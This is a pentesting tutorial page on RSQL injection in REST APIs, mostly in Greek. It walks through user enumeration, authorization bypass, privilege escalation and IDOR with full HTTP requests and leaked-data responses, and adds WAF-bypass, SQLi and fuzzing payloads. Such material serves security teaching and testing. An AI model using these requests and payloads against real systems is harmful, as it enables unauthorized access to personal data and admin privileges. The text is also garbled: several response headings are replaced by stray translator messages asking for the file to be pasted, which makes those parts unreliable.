# RSQL Injection

{{#include ../banners/hacktricks-training.md}}

## Τι είναι το RSQL;
RSQL είναι μια γλώσσα ερωτημάτων σχεδιασμένη για παραμετροποιημένο φιλτράρισμα εισόδων σε RESTful APIs. Βασισμένο στο FIQL (Feed Item Query Language), που αρχικά ορίστηκε από τον Mark Nottingham για ερωτήματα σε Atom feeds, το RSQL ξεχωρίζει για την απλότητά του και την ικανότητά του να εκφράζει σύνθετα ερωτήματα με συμπαγή και συμβατό με URI τρόπο πάνω από HTTP. Αυτό το καθιστά εξαιρετική επιλογή ως γενική γλώσσα ερωτημάτων για αναζητήσεις σε REST endpoints.

## Επισκόπηση
RSQL Injection είναι μια ευπάθεια σε εφαρμογές ιστού που χρησιμοποιούν το RSQL ως γλώσσα ερωτημάτων σε RESTful APIs. Παρόμοια με [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection) και [LDAP Injection](https://owasp.org/www-community/attacks/LDAP_Injection), αυτή η ευπάθεια εμφανίζεται όταν τα φίλτρα RSQL δεν απολυμαίνονται σωστά, επιτρέποντας σε έναν επιτιθέμενο να εισάγει κακόβουλα ερωτήματα για πρόσβαση, τροποποίηση ή διαγραφή δεδομένων χωρίς εξουσιοδότηση.

## Πώς λειτουργεί;
Το RSQL σας επιτρέπει να δημιουργείτε σύνθετα ερωτήματα σε RESTful APIs, για παράδειγμα:
```bash
/products?filter=price>100;category==electronics
```
Αυτό μεταφράζεται σε ένα δομημένο ερώτημα που φιλτράρει προϊόντα με τιμή μεγαλύτερη από 100 και κατηγορία «ηλεκτρονικά».

Αν η εφαρμογή δεν επικυρώνει σωστά την είσοδο του χρήστη, ένας επιτιθέμενος θα μπορούσε να χειριστεί το φίλτρο ώστε να εκτελέσει απρόσμενα ερωτήματα, όπως:
```bash
/products?filter=id=in=(1,2,3);delete_all==true
```
Ή ακόμη να εκμεταλλευτείτε για να εξάγετε ευαίσθητες πληροφορίες με Boolean queries ή nested subqueries.

## Κίνδυνοι
- **Έκθεση ευαίσθητων δεδομένων:** Ένας επιτιθέμενος μπορεί να ανακτήσει πληροφορίες που δεν θα έπρεπε να είναι προσβάσιμες.
- **Τροποποίηση ή διαγραφή δεδομένων:** Έγχυση φίλτρων που αλλάζουν εγγραφές της βάσης δεδομένων.
- **Ανύψωση προνομίων:** Χειρισμός ταυτοτήτων που αποδίδουν ρόλους μέσω φίλτρων για να παραπλανήσουν την εφαρμογή και να αποκτήσουν πρόσβαση με τα προνόμια άλλων χρηστών.
- **Παράκαμψη ελέγχων πρόσβασης:** Χειρισμός φίλτρων για πρόσβαση σε περιορισμένα δεδομένα.
- **Μίμηση ταυτότητας ή IDOR:** Τροποποίηση ταυτοτήτων χρηστών μέσω φίλτρων που επιτρέπουν πρόσβαση σε πληροφορίες και πόρους άλλων χρηστών χωρίς να είναι σωστά πιστοποιημένος ως αυτοί.

## Υποστηριζόμενοι τελεστές RSQL
| Operator  | Περιγραφή | Παράδειγμα  |
|:----: |:----: |:------------------:|
| `;` / `and` | Λογικός τελεστής AND. Φιλτράρει σειρές όπου *και οι δύο* προϋποθέσεις είναι *αληθείς* | `/api/v2/myTable?q=columnA==valueA;columnB==valueB` |
| `,` / `or` | Λογικός τελεστής OR. Φιλτράρει σειρές όπου *τουλάχιστον μία* προϋπόθεση είναι *αληθής*| `/api/v2/myTable?q=columnA==valueA,columnB==valueB` |
| `==` | Εκτελεί ερώτημα ισότητας. Επιστρέφει όλες τις σειρές από *myTable* όπου οι τιμές στη *columnA* ισούνται ακριβώς με το *queryValue* | `/api/v2/myTable?q=columnA==queryValue` |
| `=q=` | Εκτελεί ερώτημα αναζήτησης. Επιστρέφει όλες τις σειρές από *myTable* όπου οι τιμές στη *columnA* περιέχουν το *queryValue* | `/api/v2/myTable?q=columnA=q=queryValue` |
| `=like=` | Εκτελεί ερώτημα like. Επιστρέφει όλες τις σειρές από *myTable* όπου οι τιμές στη *columnA* μοιάζουν με το *queryValue* | `/api/v2/myTable?q=columnA=like=queryValue` |
| `=in=` | Εκτελεί ερώτημα in. Επιστρέφει όλες τις σειρές από *myTable* όπου η *columnA* περιέχει *valueA* OR *valueB* | `/api/v2/myTable?q=columnA=in=(valueA, valueB)` |
| `=out=` | Εκτελεί ερώτημα αποκλεισμού. Επιστρέφει όλες τις σειρές του *myTable* όπου οι τιμές στη *columnA* δεν είναι ούτε *valueA* ούτε *valueB* | `/api/v2/myTable?q=columnA=out=(valueA,valueB)` |
| `!=` | Εκτελεί ερώτημα μη-ισότητας. Επιστρέφει όλες τις σειρές από *myTable* όπου οι τιμές στη *columnA* δεν ισούνται με το *queryValue* | `/api/v2/myTable?q=columnA!=queryValue` |
| `=notlike=` | Εκτελεί ερώτημα not like. Επιστρέφει όλες τις σειρές από *myTable* όπου οι τιμές στη *columnA* δεν μοιάζουν με το *queryValue* | `/api/v2/myTable?q=columnA=notlike=queryValue` |
| `<` & `=lt=` | Εκτελεί ερώτημα "μικρότερο από". Επιστρέφει όλες τις σειρές από *myTable* όπου οι τιμές στη *columnA* είναι μικρότερες από το *queryValue* | `/api/v2/myTable?q=columnA<queryValue` <br> `/api/v2/myTable?q=columnA=lt=queryValue` |
| `=le=` & `<=` | Εκτελεί ερώτημα "μικρότερο ή ίσο". Επιστρέφει όλες τις σειρές από *myTable* όπου οι τιμές στη *columnA* είναι μικρότερες ή ίσες με το *queryValue* | `/api/v2/myTable?q=columnA<=queryValue` <br> `/api/v2/myTable?q=columnA=le=queryValue` |
| `>` & `=gt=` | Εκτελεί ερώτημα "μεγαλύτερο από". Επιστρέφει όλες τις σειρές από *myTable* όπου οι τιμές στη *columnA* είναι μεγαλύτερες από το *queryValue* | `/api/v2/myTable?q=columnA>queryValue` <br> `/api/v2/myTable?q=columnA=gt=queryValue` |
| `>=` & `=ge=` | Εκτελεί ερώτημα "ίσο ή μεγαλύτερο". Επιστρέφει όλες τις σειρές από *myTable* όπου οι τιμές στη *columnA* είναι ίσες ή μεγαλύτερες από το *queryValue* | `/api/v2/myTable?q=columnA>=queryValue` <br> `/api/v2/myTable?q=columnA=ge=queryValue` |
| `=rng=` | Εκτελεί ερώτημα "από-έως". Επιστρέφει όλες τις σειρές από *myTable* όπου οι τιμές στη *columnA* είναι >= το *fromValue* και <= το *toValue* | `/api/v2/myTable?q=columnA=rng=(fromValue,toValue)` |

**Σημείωση**: Table based on information from [**MOLGENIS**](https://molgenis.gitbooks.io/molgenis/content/) and [**rsql-parser**](https://github.com/jirutka/rsql-parser) applications.

#### Παραδείγματα
- name=="Kill Bill";year=gt=2003
- name=="Kill Bill" and year>2003
- genres=in=(sci-fi,action);(director=='Christopher Nolan',actor==*Bale);year=ge=2000
- genres=in=(sci-fi,action) and (director=='Christopher Nolan' or actor==*Bale) and year>=2000
- director.lastName==Nolan;year=ge=2000;year=lt=2010
- director.lastName==Nolan and year>=2000 and year<2010
- genres=in=(sci-fi,action);genres=out=(romance,animated,horror),director==Que*Tarantino
- genres=in=(sci-fi,action) and genres=out=(romance,animated,horror) or director==Que*Tarantino

**Σημείωση**: Table based on information from [**rsql-parser**](https://github.com/jirutka/rsql-parser) application.

## Συνήθη φίλτρα
These filters help refine queries in APIs:

| Filter | Περιγραφή | Παράδειγμα |
|--------|------------|---------|
| `filter[users]` | Φιλτράρει αποτελέσματα κατά συγκεκριμένους χρήστες | `/api/v2/myTable?filter[users]=123` |
| `filter[status]` | Φιλτράρει κατά κατάσταση (active/inactive, completed, etc.) | `/api/v2/orders?filter[status]=active` |
| `filter[date]` | Φιλτράρει αποτελέσματα εντός εύρους ημερομηνιών | `/api/v2/logs?filter[date]=gte:2024-01-01` |
| `filter[category]` | Φιλτράρει κατά κατηγορία ή τύπο πόρου | `/api/v2/products?filter[category]=electronics` |
| `filter[id]` | Φιλτράρει κατά μοναδικό αναγνωριστικό | `/api/v2/posts?filter[id]=42` |

## Συνήθεις παράμετροι
These parameters help optimize API responses:

| Parameter | Περιγραφή | Παράδειγμα |
|-----------|------------|---------|
| `include` | Συμπεριλαμβάνει σχετικούς πόρους στην απάντηση | `/api/v2/orders?include=customer,items` |
| `sort` | Ταξινομεί αποτελέσματα σε αύξουσα ή φθίνουσα σειρά | `/api/v2/users?sort=-created_at` |
| `page[size]` | Ελέγχει τον αριθμό των αποτελεσμάτων ανά σελίδα | `/api/v2/products?page[size]=10` |
| `page[number]` | Καθορίζει τον αριθμό σελίδας | `/api/v2/products?page[number]=2` |
| `fields[resource]` | Ορίζει ποια πεδία θα επιστραφούν στην απάντηση | `/api/v2/users?fields[users]=id,name,email` |
| `search` | Εκτελεί πιο ευέλικτη αναζήτηση | `/api/v2/posts?search=technology` |

## Διαρροή πληροφοριών και καταγραφή χρηστών
The following request shows a registration endpoint that requires the email parameter to check if there is any user registered with that email and return a true or false depending on whether or not it exists in the database:
### Αίτημα
```
GET /api/registrations HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
I don't have the content to translate. Please paste the "### Response" section (or the relevant text from src/pentesting-web/rsql-injection.md) and I'll translate it to Greek, preserving all markdown/html syntax.
```
HTTP/1.1 400
Date: Sat, 22 Mar 2025 14:47:14 GMT
Content-Type: application/vnd.api+json
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *
Content-Length: 85

{
"errors": [{
"code": "BLANK",
"detail": "Missing required param: email",
"status": "400"
}]
}
```
Αν και αναμένεται το `/api/registrations?email=<emailAccount>`, είναι δυνατό να χρησιμοποιηθούν φίλτρα RSQL για να επιχειρηθεί η απαρίθμηση και/ή η εξαγωγή πληροφοριών χρηστών χρησιμοποιώντας ειδικούς τελεστές:

### Request
```
GET /api/registrations?filter[userAccounts]=email=='test@test.com' HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Origin: https://locahost:3000
Connection: keep-alive
Referer: https://locahost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
### Απάντηση
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 14:09:38 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 38
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": {
"attributes": {
"tenants": []
}
}
}
```
Σε περίπτωση που ταιριάξει ένας έγκυρος λογαριασμός email, η εφαρμογή θα επιστρέψει τις πληροφορίες του χρήστη αντί για το κλασικό *“true”*, *"1"* ή κάτι παρόμοιο στην απάντηση προς τον server:
### Αίτημα
```
GET /api/registrations?filter[userAccounts]=email=='manuel**********@domain.local' HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
### Απάντηση
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 14:19:46 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 293
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": {
"id": "********************",
"type": "UserAccountDTO",
"attributes": {
"id": "********************",
"type": "UserAccountDTO",
"email": "manuel**********@domain.local",
"sub": "*********************",
"status": "ACTIVE",
"tenants": [{
"id": "1"
}]
}
}
}
```
## Παράκαμψη εξουσιοδότησης
Σε αυτό το σενάριο, ξεκινάμε από έναν χρήστη με βασικό ρόλο και ο οποίος δεν διαθέτει προνομιακά δικαιώματα (π.χ. διαχειριστής) για να αποκτήσουμε πρόσβαση στη λίστα όλων των χρηστών που είναι καταχωρημένοι στη βάση δεδομένων:
### Αίτημα
```
GET /api/users HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJhb.................
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
Δεν παρέχεται το περιεχόμενο του αρχείου. Μπορείτε να επικολλήσετε εδώ το περιεχόμενο του src/pentesting-web/rsql-injection.md ώστε να το μεταφράσω στα Ελληνικά;
```
HTTP/1.1 403
Date: Sat, 22 Mar 2025 14:40:07 GMT
Content-Length: 0
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *
```
Στο σημείο αυτό χρησιμοποιούμε ξανά τα φίλτρα και τους ειδικούς τελεστές που μας επιτρέπουν έναν εναλλακτικό τρόπο να αποκτήσουμε τις πληροφορίες των *users* και να παρακάμψουμε τον έλεγχο πρόσβασης.
Για παράδειγμα, φιλτράρετε όσους *users* περιέχουν το γράμμα “*a*” στο user *ID* τους:
### Request
```
GET /api/users?filter[users]=id=in=(*a*) HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJhb.................
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
I don't have the content of src/pentesting-web/rsql-injection.md. Please paste the markdown you want translated and I will return a Greek translation preserving all markdown, code, links and tags as requested.
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 14:43:28 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 1434192
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": [{
"id": "********A***********",
"type": "UserGetResponseCustomDTO",
"attributes": {
"status": "ACTIVE",
"countryId": 63,
"timeZoneId": 3,
"translationKey": "************",
"email": "**********@domain.local",
"firstName": "rafael",
"surname": "************",
"telephoneCountryCode": "**",
"mobilePhone": "*********",
"taxIdentifier": "********",
"languageId": 1,
"createdAt": "2024-08-09T10:57:41.237Z",
"termsOfUseAccepted": true,
"id": "******************",
"type": "UserGetResponseCustomDTO"
}
}, {
"id": "*A*******A*****A*******A******",
"type": "UserGetResponseCustomDTO",
"attributes": {
"status": "ACTIVE",
"countryId": 63,
"timeZoneId": 3,
"translationKey": ""************",
"email": "juan*******@domain.local",
"firstName": "juan",
"surname": ""************",",
"telephoneCountryCode": "**",
"mobilePhone": "************",
"taxIdentifier": "************",
"languageId": 1,
"createdAt": "2024-07-18T06:07:37.68Z",
"termsOfUseAccepted": true,
"id": "*******************",
"type": "UserGetResponseCustomDTO"
}
}, {
................
```
## Privilege Escalation
Είναι πολύ πιθανό να βρείτε ορισμένα endpoints που ελέγχουν τα δικαιώματα χρήστη μέσω του ρόλου τους. Για παράδειγμα, αντιμετωπίζουμε έναν χρήστη που δεν έχει δικαιώματα:
### Αίτημα
```
GET /api/companyUsers?include=role HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJhb......
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
I don't have the file content. Please paste the markdown from src/pentesting-web/rsql-injection.md here and I'll translate it to Greek, preserving all markdown/html tags, links and paths.
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 19:13:08 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 11
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": []
}
```
### Request

Χρησιμοποιώντας ορισμένους τελεστές μπορούμε να εντοπίσουμε τους χρήστες διαχειριστή:
```
GET /api/companyUsers?include=role&filter[companyUsers]=user.id=='94****************************' HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJh.....
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
I don't have the contents of src/pentesting-web/rsql-injection.md. Please paste the markdown content you want translated (or attach the file), and I'll translate the English text to Greek while preserving all code, tags, links and paths.
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 19:13:45 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 361
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": [{
"type": "CompanyUserGetResponseDTO",
"attributes": {
"companyId": "FA**************",
"companyTaxIdentifier": "B999*******",
"bizName": "company sl",
"email": "jose*******@domain.local",
"userRole": {
"userRoleId": 1,
"userRoleKey": "general.roles.admin"
},
"companyCountryTranslationKey": "*******",
"type": "CompanyUserGetResponseDTO"
}
}]
}
```
Αφού γνωρίζετε το αναγνωριστικό ενός χρήστη διαχειριστή, θα ήταν δυνατό να εκμεταλλευτείτε μια ανύψωση προνομίων αντικαθιστώντας ή προσθέτοντας το αντίστοιχο φίλτρο με το αναγνωριστικό του διαχειριστή και αποκτώντας τα ίδια προνόμια:
### Αίτημα
```
GET /api/functionalities/allPermissionsFunctionalities?filter[companyUsers]=user.id=='94****************************' HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJ.....
Origin: https:/localhost:3000
Connection: keep-alive
Referer: https:/localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
### Απάντηση
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 18:53:00 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 68833
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"meta": {
"Functionalities": [{
"functionalityId": 1,
"permissionId": 1,
"effectivePriority": "PERMIT",
"effectiveBehavior": "PERMIT",
"translationKey": "general.userProfile",
"type": "FunctionalityPermissionDTO"
}, {
"functionalityId": 2,
"permissionId": 2,
"effectivePriority": "PERMIT",
"effectiveBehavior": "PERMIT",
"translationKey": "general.my_profile",
"type": "FunctionalityPermissionDTO"
}, {
"functionalityId": 3,
"permissionId": 3,
"effectivePriority": "PERMIT",
"effectiveBehavior": "PERMIT",
"translationKey": "layout.change_user_data",
"type": "FunctionalityPermissionDTO"
}, {
"functionalityId": 4,
"permissionId": 4,
"effectivePriority": "PERMIT",
"effectiveBehavior": "PERMIT",
"translationKey": "general.configuration",
"type": "FunctionalityPermissionDTO"
}, {
....
}]
}
}
```
## Impersonate or Insecure Direct Object References (IDOR)
Εκτός από τη χρήση της παραμέτρου `filter`, είναι δυνατή η χρήση και άλλων παραμέτρων όπως η `include`, η οποία επιτρέπει τη συμπερίληψη στο αποτέλεσμα ορισμένων πεδίων (π.χ. γλώσσα, χώρα, κωδικός πρόσβασης...).

Στο παρακάτω παράδειγμα εμφανίζονται οι πληροφορίες του προφίλ του χρήστη μας:
### Αίτημα
```
GET /api/users?include=language,country HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJ...
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
Μπορείτε να επικολλήσετε το περιεχόμενο του αρχείου src/pentesting-web/rsql-injection.md που θέλετε να μεταφράσω στα Ελληνικά;
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 19:47:27 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 540
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": [{
"id": "D5********************",
"type": "UserGetResponseCustomDTO",
"attributes": {
"status": "ACTIVE",
"countryId": 63,
"timeZoneId": 3,
"translationKey": "**********",
"email": "domingo....@domain.local",
"firstName": "Domingo",
"surname": "**********",
"telephoneCountryCode": "**",
"mobilePhone": "******",
"languageId": 1,
"createdAt": "2024-03-11T07:24:57.627Z",
"termsOfUseAccepted": true,
"howMeetUs": "**************",
"id": "D5********************",
"type": "UserGetResponseCustomDTO"
}
}]
}
```
Ο συνδυασμός των φίλτρων μπορεί να χρησιμοποιηθεί για να παρακάμψει τον έλεγχο εξουσιοδότησης και να αποκτήσει πρόσβαση στα προφίλ άλλων χρηστών:
### Αίτημα
```
GET /api/users?include=language,country&filter[users]=id=='94***************' HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJ...
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
Δεν παρέχεται το περιεχόμενο του αρχείου. Στείλε το κείμενο που θέλεις να μεταφράσω (ή ανέβασε το αρχείο src/pentesting-web/rsql-injection.md) για να το μεταφράσω στα Ελληνικά.
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 19:50:07 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 520
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": [{
"id": "94******************",
"type": "UserGetResponseCustomDTO",
"attributes": {
"status": "ACTIVE",
"countryId": 63,
"timeZoneId": 2,
"translationKey": "**************",
"email": "jose******@domain.local",
"firstName": "jose",
"surname": "***************",
"telephoneCountryCode": "**",
"mobilePhone": "********",
"taxIdentifier": "*********",
"languageId": 1,
"createdAt": "2024-11-21T08:29:05.833Z",
"termsOfUseAccepted": true,
"id": "94******************",
"type": "UserGetResponseCustomDTO"
}
}]
}
```
## Ανίχνευση & fuzzing — γρήγορες νίκες
- Ελέγξτε για υποστήριξη RSQL στέλνοντας αβλαβείς δοκιμές όπως `?filter=id==test`, `?q==test` ή κακοσχηματισμένους operators `=foo=`; οι λεπτομερείς APIs συχνά leak parser errors ("Unknown operator" / "Unknown property").
- Πολλές υλοποιήσεις double-parse παραμέτρους URL· δοκιμάστε double-encoding `(`, `)`, `*`, `;` (π.χ., `%2528admin%2529`) για να παρακάμψετε naive blocklists και WAFs.
- Boolean exfil με wildcards: `filter[users]=email==*%@example.com;status==ACTIVE` και αντιστρέψτε τη λογική με `,` (OR) για να συγκρίνετε τα μεγέθη των αποκρίσεων.
- Range/proximity leaks: `filter[users]=createdAt=rng=(2024-01-01,2025-01-01)` επιτρέπει γρήγορη απαρίθμηση ανά έτος χωρίς να γνωρίζετε τα ακριβή IDs.

## Κατάχρηση σε συγκεκριμένα frameworks (Elide / JPA Specification / JSON:API)
- Elide και πολλά Spring Data REST projects μεταφράζουν RSQL απευθείας σε JPA Criteria. Όταν οι developers προσθέτουν custom operators (π.χ., `=ilike=`) και κατασκευάζουν predicates μέσω string concatenation αντί για prepared parameters, μπορείτε να pivot σε SQLi (κλασικό payload: `name=ilike='%%' OR 1=1--'`).
- Το Elide analytic data store δέχεται parameterized columns· ο συνδυασμός user-controlled analytic params με RSQL filters ήταν η βασική αιτία του SQLi στο CVE-2022-24827. Ακόμα και αν οι patched εκδόσεις παραμετροποιούν σωστά, παρόμοιος bespoke κώδικας συχνά παραμένει — αναζητήστε `@JoinFilter`/`@ReadPermission` SpEL expressions που περιέχουν `${}` και δοκιμάστε να injektάρετε `';sleep(5);'` ή λογικές ταυτολογίες.
- Τα JSON:API backends συνήθως εκθέτουν και `include` και `filter`. Η φιλτραρίση σε σχετιζόμενους πόρους `filter[orders]=customer.email==*admin*` μπορεί να παρακάμψει top-level ACLs επειδή relation-level filters εκτελούνται πριν τους ελέγχους ιδιοκτησίας.

## Automation helpers
- **rsql-parser CLI (Java)**: `java -jar rsql-parser.jar "name=='*admin*';status==ACTIVE"` επαληθεύει payloads τοπικά και δείχνει το abstract syntax tree — χρήσιμο για τη δημιουργία ισορροπημένων παρενθέσεων και custom operators.
- **Python quick builder**:
```python
from pyrsql import RSQL
payload = RSQL().and_("email==*admin*", "status==ACTIVE").or_("role=in=(owner,admin)")
print(str(payload))
```
- Συνδυάστε με HTTP fuzzer (ffuf, turbo-intruder) επαναλαμβάνοντας τις θέσεις wildcard `*a*`, `*e*`, etc., μέσα σε λίστες `=in=` για να enumerate γρήγορα τα IDs και τα emails.

## Αναφορές
- [RSQL Injection](https://owasp.org/www-community/attacks/RSQL_Injection)
- [RSQL Injection Exploitation](https://m3n0sd0n4ld.github.io/patoHackventuras/rsql_injection_exploitation)
- [Elide filtering & security considerations](https://elide.io/pages/guide/03-analytics.html)

{{#include ../banners/hacktricks-training.md}}
